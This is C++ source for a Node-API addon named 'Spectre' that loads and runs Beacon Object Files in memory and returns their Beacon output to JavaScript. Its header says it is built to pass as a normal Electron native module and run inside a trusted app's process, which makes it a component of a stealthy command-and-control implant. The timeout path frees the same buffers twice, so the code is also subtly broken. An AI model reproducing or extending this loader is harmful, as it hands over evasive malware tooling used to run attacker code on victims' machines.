/**
 * Spectre - COFF Loader Node-API Addon
 *
 * Wraps the COFF parser/loader as a Node.js native addon (.node file).
 * JavaScript calls coffLoader.runCOFF(functionName, bofBuffer, argBuffer, argSize, timeout)
 * and receives the captured Beacon output as a string.
 *
 * This is loaded at runtime via require() - it appears as a normal
 * Electron native module, executing under the trusted app's process.
 */

#include <napi.h>
#include <windows.h>
#include <string.h>
#include "../include/beacon.h"

// Forward declaration from coff_parser.cpp
extern int RunCOFF(
    const char* entryName,
    uint8_t*    coffData,
    uint32_t    coffSize,
    uint8_t*    argData,
    uint32_t    argSize
);

// ============================================================
// Thread wrapper for BOF execution with timeout
// ============================================================

typedef struct {
    const char* entryName;
    uint8_t*    coffData;
    uint32_t    coffSize;
    uint8_t*    argData;
    uint32_t    argSize;
    int         result;
} COFFThreadArgs;

static DWORD WINAPI RunCOFFThread(LPVOID lpParam) {
    COFFThreadArgs* args = (COFFThreadArgs*)lpParam;
    args->result = RunCOFF(
        args->entryName,
        args->coffData,
        args->coffSize,
        args->argData,
        args->argSize
    );
    return 0;
}

// ============================================================
// Node-API wrapper: runCOFF
// ============================================================

/**
 * runCOFF(functionName, coffBuffer, argBuffer, argSize, [timeoutMs])
 *
 * @param functionName  String - BOF entry point name (e.g., "go")
 * @param coffBuffer    Buffer - Raw COFF object file bytes
 * @param argBuffer     Buffer - Serialized argument data
 * @param argSize       Number - Size of argument data
 * @param timeoutMs     Number - Optional execution timeout (default: 30000)
 * @returns             String - Captured Beacon output
 */
Napi::Value RunCOFFWrapper(const Napi::CallbackInfo& info) {
    Napi::Env env = info.Env();

    // Validate arguments
    if (info.Length() < 4) {
        Napi::TypeError::New(env,
            "Expected: functionName (string), coffData (Buffer), "
            "argData (Buffer), argSize (number), [timeoutMs (number)]"
        ).ThrowAsJavaScriptException();
        return env.Null();
    }

    if (!info[0].IsString()) {
        Napi::TypeError::New(env, "First argument must be a string (functionName)")
            .ThrowAsJavaScriptException();
        return env.Null();
    }

    if (!info[1].IsBuffer()) {
        Napi::TypeError::New(env, "Second argument must be a Buffer (coffData)")
            .ThrowAsJavaScriptException();
        return env.Null();
    }

    if (!info[2].IsBuffer()) {
        Napi::TypeError::New(env, "Third argument must be a Buffer (argData)")
            .ThrowAsJavaScriptException();
        return env.Null();
    }

    if (!info[3].IsNumber()) {
        Napi::TypeError::New(env, "Fourth argument must be a number (argSize)")
            .ThrowAsJavaScriptException();
        return env.Null();
    }

    // Extract arguments
    std::string functionName = info[0].As<Napi::String>().Utf8Value();
    Napi::Buffer<uint8_t> coffBuf = info[1].As<Napi::Buffer<uint8_t>>();
    Napi::Buffer<uint8_t> argBuf = info[2].As<Napi::Buffer<uint8_t>>();
    uint32_t argSize = info[3].As<Napi::Number>().Uint32Value();
    uint32_t timeoutMs = 30000;

    if (info.Length() > 4 && info[4].IsNumber()) {
        timeoutMs = info[4].As<Napi::Number>().Uint32Value();
    }

    // Make copies of the data (so JS GC can't move it during execution)
    uint32_t coffSize = (uint32_t)coffBuf.Length();
    uint8_t* coffData = (uint8_t*)malloc(coffSize);
    if (!coffData) {
        Napi::Error::New(env, "Failed to allocate memory for COFF data")
            .ThrowAsJavaScriptException();
        return env.Null();
    }
    memcpy(coffData, coffBuf.Data(), coffSize);

    uint8_t* argData = NULL;
    if (argBuf.Length() > 0) {
        argData = (uint8_t*)malloc(argBuf.Length());
        if (argData) {
            memcpy(argData, argBuf.Data(), argBuf.Length());
        }
    }

    // Initialize output capture
    BeaconOutputInit();

    // Set up thread arguments
    COFFThreadArgs threadArgs;
    threadArgs.entryName = functionName.c_str();
    threadArgs.coffData = coffData;
    threadArgs.coffSize = coffSize;
    threadArgs.argData = argData;
    threadArgs.argSize = argSize;
    threadArgs.result = 0;

    // Execute in a separate thread with timeout
    HANDLE hThread = CreateThread(
        NULL,
        0,
        RunCOFFThread,
        &threadArgs,
        0,
        NULL
    );

    if (!hThread) {
        free(coffData);
        if (argData) free(argData);
        Napi::Error::New(env, "Failed to create execution thread")
            .ThrowAsJavaScriptException();
        return env.Null();
    }

    // Wait for completion with timeout
    DWORD waitResult = WaitForSingleObject(hThread, timeoutMs);

    if (waitResult == WAIT_TIMEOUT) {
        TerminateThread(hThread, 1);
        CloseHandle(hThread);
        free(coffData);
        if (argData) free(argData);

        BeaconPrintf(CALLBACK_ERROR, "BOF execution timed out after %dms", timeoutMs);
    } else {
        CloseHandle(hThread);
    }

    // Get captured output
    int outputLen = 0;
    char* outputData = BeaconOutputGetData(&outputLen);

    Napi::String result = Napi::String::New(env, "");
    if (outputData && outputLen > 0) {
        result = Napi::String::New(env, outputData, outputLen);
    }

    // Cleanup
    BeaconOutputFree();
    free(coffData);
    if (argData) free(argData);

    return result;
}

// ============================================================
// Node-API wrapper: packArgs
//
// Helper to pack arguments into BOF format:
//   4-byte total size + entries
//   Each entry: type byte + data
//   Types: 's' = short, 'i' = int, 'z' = string, 'b' = binary
// ============================================================

Napi::Value PackArgs(const Napi::CallbackInfo& info) {
    Napi::Env env = info.Env();

    if (info.Length() < 1 || !info[0].IsArray()) {
        Napi::TypeError::New(env, "Expected an array of {type, value} objects")
            .ThrowAsJavaScriptException();
        return env.Null();
    }

    Napi::Array args = info[0].As<Napi::Array>();
    uint32_t count = args.Length();

    // First pass: calculate total size
    uint32_t totalSize = 4; // 4-byte length prefix

    for (uint32_t i = 0; i < count; i++) {
        Napi::Object arg = args.Get(i).As<Napi::Object>();
        std::string type = arg.Get("type").As<Napi::String>().Utf8Value();

        if (type == "short" || type == "s") {
            totalSize += 2;
        } else if (type == "int" || type == "i") {
            totalSize += 4;
        } else if (type == "string" || type == "z") {
            std::string val = arg.Get("value").As<Napi::String>().Utf8Value();
            totalSize += 4 + (uint32_t)val.length() + 1; // length prefix + string + null
        } else if (type == "wstring" || type == "Z") {
            std::string val = arg.Get("value").As<Napi::String>().Utf8Value();
            totalSize += 4 + ((uint32_t)val.length() + 1) * 2; // length prefix + wide string + null
        } else if (type == "binary" || type == "b") {
            Napi::Buffer<uint8_t> buf = arg.Get("value").As<Napi::Buffer<uint8_t>>();
            totalSize += 4 + (uint32_t)buf.Length(); // length prefix + data
        }
    }

    // Allocate and pack
    Napi::Buffer<uint8_t> result = Napi::Buffer<uint8_t>::New(env, totalSize);
    uint8_t* ptr = result.Data();
    uint32_t offset = 0;

    // Total size prefix
    *(uint32_t*)(ptr + offset) = totalSize - 4;
    offset += 4;

    for (uint32_t i = 0; i < count; i++) {
        Napi::Object arg = args.Get(i).As<Napi::Object>();
        std::string type = arg.Get("type").As<Napi::String>().Utf8Value();

        if (type == "short" || type == "s") {
            int16_t val = (int16_t)arg.Get("value").As<Napi::Number>().Int32Value();
            *(int16_t*)(ptr + offset) = val;
            offset += 2;
        } else if (type == "int" || type == "i") {
            int32_t val = arg.Get("value").As<Napi::Number>().Int32Value();
            *(int32_t*)(ptr + offset) = val;
            offset += 4;
        } else if (type == "string" || type == "z") {
            std::string val = arg.Get("value").As<Napi::String>().Utf8Value();
            uint32_t len = (uint32_t)val.length() + 1;
            *(uint32_t*)(ptr + offset) = len;
            offset += 4;
            memcpy(ptr + offset, val.c_str(), len);
            offset += len;
        } else if (type == "wstring" || type == "Z") {
            std::string val = arg.Get("value").As<Napi::String>().Utf8Value();
            uint32_t wideLen = ((uint32_t)val.length() + 1) * 2;
            *(uint32_t*)(ptr + offset) = wideLen;
            offset += 4;
            // Simple ASCII to wide conversion
            for (size_t j = 0; j <= val.length(); j++) {
                *(uint16_t*)(ptr + offset) = (uint16_t)(uint8_t)val[j];
                offset += 2;
            }
        } else if (type == "binary" || type == "b") {
            Napi::Buffer<uint8_t> buf = arg.Get("value").As<Napi::Buffer<uint8_t>>();
            uint32_t len = (uint32_t)buf.Length();
            *(uint32_t*)(ptr + offset) = len;
            offset += 4;
            memcpy(ptr + offset, buf.Data(), len);
            offset += len;
        }
    }

    return result;
}

// ============================================================
// Module initialization
// ============================================================

Napi::Object Init(Napi::Env env, Napi::Object exports) {
    exports.Set("runCOFF",   Napi::Function::New(env, RunCOFFWrapper));
    exports.Set("packArgs",  Napi::Function::New(env, PackArgs));
    return exports;
}

NODE_API_MODULE(coff_loader, Init)
